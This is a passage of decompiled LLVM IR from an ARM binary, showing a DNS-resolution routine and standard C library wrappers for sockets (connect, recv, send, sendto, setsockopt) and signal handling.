  %v0_1206c = load i32, i32* @r5, align 4
  %v1_1206c = load i32, i32* %ip.global-to-local, align 4
  %v2_1206c = add i32 %v1_1206c, 4
  %v3_1206c = inttoptr i32 %v2_1206c to i32*
  store i32 %v0_1206c, i32* %v3_1206c, align 4
  %v0_12070 = load i32, i32* @r7, align 4
  %v2_12074 = inttoptr i32 %v0_12068 to i8*
  %v3_12074 = call i32 @inet_aton(i8* %v2_12074, i32 %v0_12070)
  store i32 %v3_12074, i32* %r0.global-to-local, align 4
  %v2_12078 = icmp eq i32 %v3_12074, 0
  br i1 %v2_12078, label %dec_label_pc_120bc, label %dec_label_pc_12084

dec_label_pc_12084:                               ; preds = %dec_label_pc_12044
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_12088 = load i32, i32* @sl, align 4
  %v2_12088 = add i32 %v1_12088, 8
  %v3_12088 = inttoptr i32 %v2_12088 to i32*
  store i32 2, i32* %v3_12088, align 4
  %v0_1208c = load i32, i32* %r3.global-to-local, align 4
  %v2_1208c = mul i32 %v0_1208c, 2
  %v1_12090 = load i32, i32* @sl, align 4
  %v2_12090 = add i32 %v1_12090, 12
  %v3_12090 = inttoptr i32 %v2_12090 to i32*
  store i32 %v2_1208c, i32* %v3_12090, align 4
  %v3_12094 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_12094, i32* %r2.global-to-local, align 4
  store i32 %v1_12048, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* @ip, align 4
  %v0_120a0 = load i32, i32* @r5, align 4
  store i32 %v0_120a0, i32* %r0.global-to-local, align 4
  %v0_120a4 = load i32, i32* @sl, align 4
  %v2_120a4 = inttoptr i32 %v3_12094 to i32*
  store i32 %v0_120a4, i32* %v2_120a4, align 4
  %v0_120a8 = load i32, i32* @r6, align 4
  %v1_120a8 = load i32, i32* @sl, align 4
  %v2_120a8 = inttoptr i32 %v1_120a8 to i32*
  store i32 %v0_120a8, i32* %v2_120a8, align 4
  %v0_120ac = load i32, i32* @sb, align 4
  %v1_120ac = load i32, i32* @sl, align 4
  %v2_120ac = add i32 %v1_120ac, 16
  %v3_120ac = inttoptr i32 %v2_120ac to i32*
  store i32 %v0_120ac, i32* %v3_120ac, align 4
  %v0_120b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_120b0 = load i32, i32* @sl, align 4
  %v2_120b0 = add i32 %v1_120b0, 4
  %v3_120b0 = inttoptr i32 %v2_120b0 to i32*
  store i32 %v0_120b0, i32* %v3_120b0, align 4
  %v0_120b4 = load i32, i32* @r5, align 4
  %v1_120b4 = load i32, i32* @ip, align 4
  %v2_120b4 = inttoptr i32 %v1_120b4 to i32*
  store i32 %v0_120b4, i32* %v2_120b4, align 4
  br label %dec_label_pc_12294

dec_label_pc_120bc:                               ; preds = %dec_label_pc_12044
  %v2_120bc = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_120bc, i32* @r5, align 4
  %v1_120c0 = call i32 @__open_nameservers(i32 0)
  store i32 ptrtoint (i32* @global_var_2282c.430 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_120bc, i32* @r0, align 4
  store i32 79548, i32* %r3.global-to-local, align 4
  %v1_120d8 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_136b4.305 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2282c.430 to i32), i32* %r0.global-to-local, align 4
  %v1_120e8 = call i32 @__pthread_return_0()
  store i32 %v2_120bc, i32* @r0, align 4
  %v2_120f4 = load i32, i32* @global_var_28ba8.435, align 4
  store i32 %v2_120f4, i32* @r4, align 4
  store i32 79548, i32* %r3.global-to-local, align 4
  %v1_12104 = call i32 @__pthread_return_void()
  %v2_12110 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_28b9c.438 to i32), i32* %r3.global-to-local, align 4
  %v0_1211c = load i32, i32* @fp, align 4
  store i32 %v0_1211c, i32* %r0.global-to-local, align 4
  %v2_12120 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_12120, i32* @ip, align 4
  %v0_12124 = load i32, i32* @r4, align 4
  store i32 %v0_12124, i32* %r2.global-to-local, align 4
  %v6_12138 = inttoptr i32 %v0_1211c to i8*
  %v7_12138 = call i32 @__dns_lookup(i8* %v6_12138, i32 1, i32 %v0_12124, i32 ptrtoint (i32* @global_var_28b9c.438 to i32), i32 %v2_12110, i32 %v2_12120)
  store i32 %v7_12138, i32* %r0.global-to-local, align 4
  %v1_1213c = icmp slt i32 %v7_12138, 0
  br i1 %v1_1213c, label %.dec_label_pc_12268_crit_edge, label %dec_label_pc_1214c

.dec_label_pc_12268_crit_edge:                    ; preds = %dec_label_pc_120bc
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12268

dec_label_pc_1214c:                               ; preds = %dec_label_pc_120bc
  store i32 256, i32* %r3.global-to-local, align 4
  %v1_12160 = load i32, i32* @r8, align 4
  %tmp35 = icmp ugt i32 %v1_12160, 255
  br i1 %tmp35, label %dec_label_pc_121fc, label %dec_label_pc_12168

dec_label_pc_12168:                               ; preds = %dec_label_pc_1214c
  %v3_12168 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_12168, i32* @r0, align 4
  %v0_1216c = call i32 @free()
  %v3_12170 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_12170, i32* @r0, align 4
  %v0_12174 = call i32 @free()
  store i32 %arg6, i32* %r3.global-to-local, align 4
  store i32 -1, i32* @ip, align 4
  store i32 34, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %v1_11fb4, align 4
  br label %dec_label_pc_12294

dec_label_pc_121fc:                               ; preds = %dec_label_pc_1214c
  %v3_12200.pre = load i32, i32* %stack_var_-96, align 4
  %v0_12204.pre = load i32, i32* @r6, align 4
  store i32 %v1_12160, i32* %r2.global-to-local, align 4
  store i32 %v3_12200.pre, i32* @r1, align 4
  store i32 %v0_12204.pre, i32* %r0.global-to-local, align 4
  %v3_12208 = call i32 @strncpy(i32 %v0_12204.pre, i32 %v3_12200.pre, i32 %v1_12160)
  %v3_1220c = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_1220c, i32* @r0, align 4
  %v0_12210 = call i32 @free()
  store i32 %v0_12210, i32* %r0.global-to-local, align 4
  store i32 %tmp7, i32* %r3.global-to-local, align 4
  %v7_12218 = icmp eq i32 %tmp7, 1
  br i1 %v7_12218, label %dec_label_pc_12220, label %dec_label_pc_12274

dec_label_pc_12220:                               ; preds = %dec_label_pc_121fc
  store i32 4, i32* @r2, align 4
  %v0_12228 = load i32, i32* @r7, align 4
  store i32 %v0_12228, i32* @r0, align 4
  %v0_1222c = call i32 @memcpy()
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v1_12048, i32* %r2.global-to-local, align 4
  %v1_12238 = load i32, i32* @sl, align 4
  %v2_12238 = add i32 %v1_12238, 8
  %v3_12238 = inttoptr i32 %v2_12238 to i32*
  store i32 2, i32* %v3_12238, align 4
  %v0_1223c = load i32, i32* %r3.global-to-local, align 4
  %v2_1223c = mul i32 %v0_1223c, 2
  store i32 %v2_1223c, i32* %r3.global-to-local, align 4
  %v1_12240 = load i32, i32* @sl, align 4
  %v2_12240 = add i32 %v1_12240, 12
  %v3_12240 = inttoptr i32 %v2_12240 to i32*
  store i32 %v2_1223c, i32* %v3_12240, align 4
  %v3_12244 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_12244, i32* @r0, align 4
  %v0_12248 = load i32, i32* @r6, align 4
  %v1_12248 = load i32, i32* @sl, align 4
  %v2_12248 = inttoptr i32 %v1_12248 to i32*
  store i32 %v0_12248, i32* %v2_12248, align 4
  %v0_1224c = load i32, i32* @sb, align 4
  %v1_1224c = load i32, i32* @sl, align 4
  %v2_1224c = add i32 %v1_1224c, 16
  %v3_1224c = inttoptr i32 %v2_1224c to i32*
  store i32 %v0_1224c, i32* %v3_1224c, align 4
  %v0_12250 = load i32, i32* %r2.global-to-local, align 4
  %v1_12250 = load i32, i32* @sl, align 4
  %v2_12250 = add i32 %v1_12250, 4
  %v3_12250 = inttoptr i32 %v2_12250 to i32*
  store i32 %v0_12250, i32* %v3_12250, align 4
  %v0_12254 = call i32 @free()
  %v3_12258 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_12258, i32* @ip, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_12260 = load i32, i32* @sl, align 4
  %v2_12260 = inttoptr i32 %v3_12258 to i32*
  store i32 %v0_12260, i32* %v2_12260, align 4
  %v0_12264 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_12264, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12268

dec_label_pc_12268:                               ; preds = %.dec_label_pc_12268_crit_edge, %dec_label_pc_12220
  %v0_1226c = phi i32 [ 1, %.dec_label_pc_12268_crit_edge ], [ %v0_12264, %dec_label_pc_12220 ]
  store i32 %arg6, i32* %r2.global-to-local, align 4
  store i32 %v0_1226c, i32* %v1_11fb4, align 4
  br label %dec_label_pc_12294

dec_label_pc_12274:                               ; preds = %dec_label_pc_121fc
  %v3_12274 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_12274, i32* @r0, align 4
  %v0_12278 = call i32 @free()
  store i32 %arg6, i32* @ip, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %v1_11fb4, align 4
  br label %dec_label_pc_12294

dec_label_pc_12290:                               ; preds = %dec_label_pc_11fec, %dec_label_pc_12038, %dec_label_pc_1201c, %dec_label_pc_12010, %dec_label_pc_11ffc
  store i32 34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12294

dec_label_pc_12294:                               ; preds = %bb, %dec_label_pc_11fd0, %dec_label_pc_11fc8, %dec_label_pc_11f70, %dec_label_pc_12274, %dec_label_pc_12268, %dec_label_pc_12168, %dec_label_pc_12084, %dec_label_pc_12290
  store i32 %v6_11f44, i32* @r5, align 4
  store i32 %v9_11f44, i32* @r6, align 4
  store i32 %v12_11f44, i32* @r7, align 4
  store i32 %v15_11f44, i32* @r8, align 4
  store i32 %v18_11f44, i32* @sb, align 4
  store i32 %v21_11f44, i32* @sl, align 4
  store i32 %v24_11f44, i32* @fp, align 4
  %v29_12298 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v29_12298

; uselistorder directives
  uselistorder i32 %v2_1223c, { 1, 0 }
  uselistorder i32 %v1_12160, { 1, 2, 0 }
  uselistorder i32 %v1_12048, { 1, 2, 0, 3 }
  uselistorder i32 %v1_12044, { 1, 0, 2 }
  uselistorder i32 %v1_12038, { 2, 1, 0, 3 }
  uselistorder i32 %v0_12004.pre, { 0, 2, 1 }
  uselistorder i32 %v1_11fe0, { 1, 0 }
  uselistorder i32* %v1_11fb4, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_11f54, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r0.global-to-local, { 19, 3, 4, 5, 6, 7, 8, 9, 12, 10, 11, 13, 15, 14, 16, 18, 17, 21, 20, 0, 1, 2 }
  uselistorder i32 %arg6, { 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_12294, { 8, 4, 5, 6, 7, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_12290, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_12268, { 1, 0 }
  uselistorder label %dec_label_pc_11ffc, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_122b8 = load i32, i32* @r4, align 4
  store i32 %v3_122b8, i32* %stack_var_-8, align 4
  %v5_122bc = call i32 @connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3)
  store i32 %v5_122bc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_122bc, -4095
  br i1 %tmp, label %dec_label_pc_122dc, label %dec_label_pc_122cc

dec_label_pc_122cc:                               ; preds = %entry
  %v0_122cc = call i32 @__errno_location()
  %v0_122d0 = load i32, i32* %r4.global-to-local, align 4
  %v1_122d0 = sub i32 0, %v0_122d0
  %v2_122d4 = inttoptr i32 %v0_122cc to i32*
  store i32 %v1_122d0, i32* %v2_122d4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_122dc

dec_label_pc_122dc:                               ; preds = %entry, %dec_label_pc_122cc
  %v0_122dc = phi i32 [ %v5_122bc, %entry ], [ -1, %dec_label_pc_122cc ]
  %v2_122e0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_122e0, i32* @r4, align 4
  ret i32 %v0_122dc

; uselistorder directives
  uselistorder i32 %v5_122bc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_122dc, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, %sockaddr* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_122e4 = load i32, i32* @r4, align 4
  store i32 %v3_122e4, i32* %stack_var_-8, align 4
  %v5_122e8 = inttoptr i32 %arg3 to i32*
  %v6_122e8 = call i32 @getsockname(i32 %arg1, %sockaddr* %arg2, i32* %v5_122e8)
  store i32 %v6_122e8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v6_122e8, -4095
  br i1 %tmp, label %dec_label_pc_12308, label %dec_label_pc_122f8

dec_label_pc_122f8:                               ; preds = %entry
  %v0_122f8 = call i32 @__errno_location()
  %v0_122fc = load i32, i32* %r4.global-to-local, align 4
  %v1_122fc = sub i32 0, %v0_122fc
  %v2_12300 = inttoptr i32 %v0_122f8 to i32*
  store i32 %v1_122fc, i32* %v2_12300, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12308

dec_label_pc_12308:                               ; preds = %entry, %dec_label_pc_122f8
  %v0_12308 = phi i32 [ %v6_122e8, %entry ], [ -1, %dec_label_pc_122f8 ]
  %v2_1230c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1230c, i32* @r4, align 4
  ret i32 %v0_12308

; uselistorder directives
  uselistorder i32 %v6_122e8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12308, { 1, 0 }
}

define i32 @getsockopt() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12310 = load i32, i32* @r4, align 4
  store i32 %v3_12310, i32* %stack_var_-8, align 4
  %v0_12318 = call i32 @getsockopt()
  store i32 %v0_12318, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12318, -4095
  br i1 %tmp, label %dec_label_pc_12338, label %dec_label_pc_12328

dec_label_pc_12328:                               ; preds = %entry
  %v0_12328 = call i32 @__errno_location()
  %v0_1232c = load i32, i32* %r4.global-to-local, align 4
  %v1_1232c = sub i32 0, %v0_1232c
  %v2_12330 = inttoptr i32 %v0_12328 to i32*
  store i32 %v1_1232c, i32* %v2_12330, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12338

dec_label_pc_12338:                               ; preds = %entry, %dec_label_pc_12328
  %v0_12338 = phi i32 [ %v0_12318, %entry ], [ -1, %dec_label_pc_12328 ]
  %v2_1233c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1233c, i32* @r4, align 4
  ret i32 %v0_12338

; uselistorder directives
  uselistorder i32 %v0_12318, { 1, 0, 2 }
  uselistorder i32 ()* @getsockopt, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12338, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12340 = load i32, i32* @r4, align 4
  store i32 %v3_12340, i32* %stack_var_-8, align 4
  %v5_12344 = call i32 @recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_12344, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_12344, -4095
  br i1 %tmp, label %dec_label_pc_12364, label %dec_label_pc_12354

dec_label_pc_12354:                               ; preds = %entry
  %v0_12354 = call i32 @__errno_location()
  %v0_12358 = load i32, i32* %r4.global-to-local, align 4
  %v1_12358 = sub i32 0, %v0_12358
  %v2_1235c = inttoptr i32 %v0_12354 to i32*
  store i32 %v1_12358, i32* %v2_1235c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12364

dec_label_pc_12364:                               ; preds = %entry, %dec_label_pc_12354
  %v0_12364 = phi i32 [ %v5_12344, %entry ], [ -1, %dec_label_pc_12354 ]
  %v2_12368 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12368, i32* @r4, align 4
  ret i32 %v0_12364

; uselistorder directives
  uselistorder i32 %v5_12344, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12364, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1236c = load i32, i32* @r4, align 4
  store i32 %v3_1236c, i32* %stack_var_-8, align 4
  %v5_12370 = call i32 @send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_12370, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_12370, -4095
  br i1 %tmp, label %dec_label_pc_12390, label %dec_label_pc_12380

dec_label_pc_12380:                               ; preds = %entry
  %v0_12380 = call i32 @__errno_location()
  %v0_12384 = load i32, i32* %r4.global-to-local, align 4
  %v1_12384 = sub i32 0, %v0_12384
  %v2_12388 = inttoptr i32 %v0_12380 to i32*
  store i32 %v1_12384, i32* %v2_12388, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12390

dec_label_pc_12390:                               ; preds = %entry, %dec_label_pc_12380
  %v0_12390 = phi i32 [ %v5_12370, %entry ], [ -1, %dec_label_pc_12380 ]
  %v2_12394 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12394, i32* @r4, align 4
  ret i32 %v0_12390

; uselistorder directives
  uselistorder i32 %v5_12370, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12390, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_12398 = load i32, i32* @r4, align 4
  store i32 %v3_12398, i32* %stack_var_-12, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_123a4 = call i32 @sendto(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, %sockaddr* null, i32 0)
  store i32 %v5_123a4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_123a4, -4095
  br i1 %tmp, label %dec_label_pc_123c4, label %dec_label_pc_123b4

dec_label_pc_123b4:                               ; preds = %entry
  %v0_123b4 = call i32 @__errno_location()
  %v0_123b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_123b8 = sub i32 0, %v0_123b8
  %v2_123bc = inttoptr i32 %v0_123b4 to i32*
  store i32 %v1_123b8, i32* %v2_123bc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_123c4

dec_label_pc_123c4:                               ; preds = %entry, %dec_label_pc_123b4
  %v0_123c4 = phi i32 [ %v5_123a4, %entry ], [ -1, %dec_label_pc_123b4 ]
  %v2_123c8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_123c8, i32* @r4, align 4
  ret i32 %v0_123c4

; uselistorder directives
  uselistorder i32 %v5_123a4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_123c4, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_123cc = load i32, i32* @r4, align 4
  store i32 %v3_123cc, i32* %stack_var_-8, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_123d4 = call i32 @setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 0)
  store i32 %v5_123d4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_123d4, -4095
  br i1 %tmp, label %dec_label_pc_123f4, label %dec_label_pc_123e4

dec_label_pc_123e4:                               ; preds = %entry
  %v0_123e4 = call i32 @__errno_location()
  %v0_123e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_123e8 = sub i32 0, %v0_123e8
  %v2_123ec = inttoptr i32 %v0_123e4 to i32*
  store i32 %v1_123e8, i32* %v2_123ec, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_123f4

dec_label_pc_123f4:                               ; preds = %entry, %dec_label_pc_123e4
  %v0_123f4 = phi i32 [ %v5_123d4, %entry ], [ -1, %dec_label_pc_123e4 ]
  %v2_123f8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_123f8, i32* @r4, align 4
  ret i32 %v0_123f4

; uselistorder directives
  uselistorder i32 %v5_123d4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_123f4, { 1, 0 }
}

define i32 @socket() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_123fc = load i32, i32* @r4, align 4
  store i32 %v3_123fc, i32* %stack_var_-8, align 4
  %v0_12400 = call i32 @socket()
  store i32 %v0_12400, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12400, -4095
  br i1 %tmp, label %dec_label_pc_12420, label %dec_label_pc_12410

dec_label_pc_12410:                               ; preds = %entry
  %v0_12410 = call i32 @__errno_location()
  %v0_12414 = load i32, i32* %r4.global-to-local, align 4
  %v1_12414 = sub i32 0, %v0_12414
  %v2_12418 = inttoptr i32 %v0_12410 to i32*
  store i32 %v1_12414, i32* %v2_12418, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12420

dec_label_pc_12420:                               ; preds = %entry, %dec_label_pc_12410
  %v0_12420 = phi i32 [ %v0_12400, %entry ], [ -1, %dec_label_pc_12410 ]
  %v2_12424 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12424, i32* @r4, align 4
  ret i32 %v0_12420

; uselistorder directives
  uselistorder i32 %v0_12400, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12420, { 1, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %tmp2 = icmp slt i32 %arg1, 1
  br i1 %tmp2, label %dec_label_pc_12444, label %dec_label_pc_12434

dec_label_pc_12434:                               ; preds = %entry
  %v8_12438 = icmp sgt i32 %arg1, 64
  br i1 %v8_12438, label %dec_label_pc_12444, label %dec_label_pc_1243c

dec_label_pc_1243c:                               ; preds = %dec_label_pc_12434
  %v0_12440 = call i32 @__sigaddset()
  br label %dec_label_pc_12444

dec_label_pc_12444:                               ; preds = %dec_label_pc_12434, %entry, %dec_label_pc_1243c
  %v0_12444 = call i32 @__errno_location()
  %v2_1244c = inttoptr i32 %v0_12444 to i32*
  store i32 22, i32* %v2_1244c, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12444, { 2, 0, 1 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  store i32 128, i32* @r2, align 4
  %v0_12464 = load i32, i32* @r0, align 4
  %v2_12464 = inttoptr i32 %v0_12464 to i8*
  %v3_12464 = call i32 @__GI_memset(i8* %v2_12464, i32 0)
  ret i32 0
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_12470 = load i32, i32* @r4, align 4
  store i32 %v3_12470, i32* %stack_var_-12, align 4
  %v6_12470 = load i32, i32* @r5, align 4
  %v10_12470 = ptrtoint i32* %stack_var_-12 to i32
  %v7_12474 = icmp eq i32 %arg2, -1
  %v0_12480.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v7_12474, label %.thread, label %bb

.thread:                                          ; preds = %entry
  br label %dec_label_pc_12498

bb:                                               ; preds = %entry
  %v2_1247c = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v0_12480.pre, i32* @r4, align 4
  %tmp19 = icmp slt i32 %v0_12480.pre, 1
  br i1 %tmp19, label %dec_label_pc_12498, label %dec_label_pc_12488

dec_label_pc_12488:                               ; preds = %bb
  %v7_1248c = icmp sgt i32 %v0_12480.pre, 64
  br i1 %v7_1248c, label %dec_label_pc_12498, label %bb20

bb20:                                             ; preds = %dec_label_pc_12488
  store i32 %arg2, i32* %stack_var_-152, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v5_124bc24 = add i32 %v10_12470, 124
  store i32 %v5_124bc24, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_124ac

dec_label_pc_12498:                               ; preds = %.thread, %dec_label_pc_12488, %bb
  %v0_12498 = call i32 @__errno_location()
  store i32 %v0_12498, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_124a4 = inttoptr i32 %v0_12498 to i32*
  store i32 22, i32* %v2_124a4, align 4
  %v0_12518.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12518

dec_label_pc_124ac:                               ; preds = %bb20, %dec_label_pc_124ac
  %v5_124bc25 = phi i32 [ %v5_124bc24, %bb20 ], [ %v5_124bc, %dec_label_pc_124ac ]
  %v2_124b0 = add i32 %v5_124bc25, -136
  %v3_124b0 = inttoptr i32 %v2_124b0 to i32*
  store i32 0, i32* %v3_124b0, align 4
  %v0_124b4.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_124b4 = add i32 %v0_124b4.pre, -1
  store i32 %v1_124b4, i32* %r0.global-to-local, align 4
  %v6_124b4 = icmp slt i32 %v1_124b4, 0
  %v4_124bc = mul i32 %v1_124b4, 4
  %v5_124bc = add i32 %v4_124bc, %v10_12470
  store i32 %v5_124bc, i32* %r2.global-to-local, align 4
  br i1 %v6_124b4, label %dec_label_pc_124c4, label %dec_label_pc_124ac

dec_label_pc_124c4:                               ; preds = %dec_label_pc_124ac
  %v2_124c4 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_124c4, i32* @r5, align 4
  %v2_124c8 = ptrtoint i32* %stack_var_-148 to i32
  store i32 %v2_124c8, i32* @r0, align 4
  %v0_124cc = load i32, i32* @r4, align 4
  store i32 %v0_124cc, i32* @r1, align 4
  %v0_124d0 = call i32 @__sigaddset()
  store i32 %v0_124d0, i32* %r0.global-to-local, align 4
  %v1_124d4 = icmp slt i32 %v0_124d0, 0
  br i1 %v1_124d4, label %dec_label_pc_12514, label %dec_label_pc_124dc

dec_label_pc_124dc:                               ; preds = %dec_label_pc_124c4
  %v0_124dc = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_28af4.440 to i32), i32* %r0.global-to-local, align 4
  %v2_124e4 = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_28af4.440 to i32), i32 %v0_124dc)
  store i32 %v2_1247c, i32* %r2.global-to-local, align 4
  %v0_124fc = load i32, i32* @r4, align 4
  store i32 %v0_124fc, i32* %r0.global-to-local, align 4
  %v4_12504 = call i32 @__libc_sigaction(i32 %v0_124fc, i32* nonnull %stack_var_-152, i32 %v2_1247c)
  store i32 %v4_12504, i32* %r0.global-to-local, align 4
  %v1_12508 = icmp slt i32 %v4_12504, 0
  br i1 %v1_12508, label %dec_label_pc_12514, label %bb23

bb23:                                             ; preds = %dec_label_pc_124dc
  %v5_1250c = load i32, i32* %stack_var_-292, align 4
  store i32 %v5_1250c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12518

dec_label_pc_12514:                               ; preds = %dec_label_pc_124dc, %dec_label_pc_124c4
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12518

dec_label_pc_12518:                               ; preds = %bb23, %dec_label_pc_12498, %dec_label_pc_12514
  %v0_12518 = phi i32 [ %v5_1250c, %bb23 ], [ %v0_12518.pre, %dec_label_pc_12498 ], [ -1, %dec_label_pc_12514 ]
  store i32 %v0_12518, i32* %r0.global-to-local, align 4
  %v2_12520 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_12520, i32* @r4, align 4
  store i32 %v6_12470, i32* @r5, align 4
  ret i32 %v0_12518

; uselistorder directives
  uselistorder i32 %v0_12518, { 1, 0 }
